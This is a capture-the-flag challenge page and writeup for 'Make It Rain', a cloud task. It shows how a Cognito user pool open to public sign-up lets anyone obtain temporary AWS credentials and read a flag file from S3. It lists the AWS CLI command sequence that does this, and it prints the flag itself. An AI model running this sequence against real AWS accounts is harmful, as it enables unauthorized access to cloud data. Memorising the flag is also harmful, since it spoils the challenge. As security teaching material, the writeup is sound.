# Challenge Name
Make It Rain

### Description
We built secure vault to store our secret flag but somehow got the blueprint of the vault leaked.Can you help us to retrieve the secret flag from the vault?

### Difficulty
5/10

### Flag
PCTF{G14d_th4T_y0u_tR13d!}

### Hints
None

### Author
__iAmPradeep

### Tester
Biplav

### Writeup
The goal of this challenge is to access a file (flag.txt) stored in an Amazon S3 bucket by authenticating via Cognito, retrieve temporary AWS credentials, and use the credentials to read the flag from S3.

The misconfiguration is due to default public registration policy. It allows anyone to register to the Cognito user pool. That allows temporary credentials to the pool which allows access to the restricted resources.

### Solve Steps
# Get client-id from terraform file and use real email to receive the registration code
1. `aws cognito-idp sign-up  --client-id 4bjmgsip08ah118ugkau5p946b --username masoncc --password 'MasonCC' --user-attributes Name="email",Value="admin@masoncc.com" --region us-east-1`

# Get the registration code from the email
2. `aws cognito-idp confirm-sign-up --client-id 4bjmgsip08ah118ugkau5p946b --username masoncc --confirmation-code 133713 --region us-east-1`

# Login and Get id-token
3. `aws cognito-idp initiate-auth --region us-east-1 --auth-flow USER_PASSWORD_AUTH --client-id 4bjmgsip08ah118ugkau5p946b --auth-parameters USERNAME=masoncc,PASSWORD=MasonCC`

# Using id-token value, Get Cognito Id for authentication
4.`aws cognito-identity get-id --identity-pool-id "us-east-1:b73a3094-c689-47e2-b9c4-311d5b7ee1ee" --region "us-east-1" --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_uSid13Z6L=id-token-output-value-from-previous-step`

# Get Credentials For Identity using identity-id that we got from last step 
5. `aws cognito-identity get-credentials-for-identity --identity-id identity-id-output-value-from-last-step --logins cognito-idp.us-east-1.amazonaws.com/us-east-1_uSid13Z6L=id-token-output-value-from-step-3`

# USE AWS SECRETS and use AWS cli 
`export AWS_ACCESS_KEY_ID=`
`export AWS_SESSION_TOKEN=`
`export AWS_SECRET_ACCESS_KEY=`
`aws s3 cp s3://patriot-ctf-cloud-ctf-challenge/flag.txt -`

# That should give the flag
`PCTF{G14d_th4T_y0u_tR13d!}`

# Solver script and gif is in the `solve` directory
## Run Steps 1 and 2 Manually.
## Goto solve directory, and in the solve script replace username and passsword.
## Run the script
